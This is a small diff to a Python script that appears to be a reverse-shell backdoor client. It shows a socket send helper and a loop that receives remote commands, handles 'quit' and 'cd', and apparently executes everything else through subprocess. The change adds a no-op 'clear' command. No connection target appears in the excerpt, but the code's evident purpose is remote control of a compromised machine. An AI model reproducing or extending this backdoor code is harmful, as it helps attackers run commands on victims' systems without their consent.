@@ -4,6 +4,7 @@ import json
 import subprocess
 import os
 
+
 def reliable_send(data):
     jsondata = json.dumps(data)
     s.send(jsondata.encode())
@@ -24,6 +25,8 @@ def shell():
         command = reliable_recv()
         if command == "quit":
             break
+        elif command == "clear":
+            pass
         elif command[:3] == "cd ":
             os.chdir(command[3:])
         else:
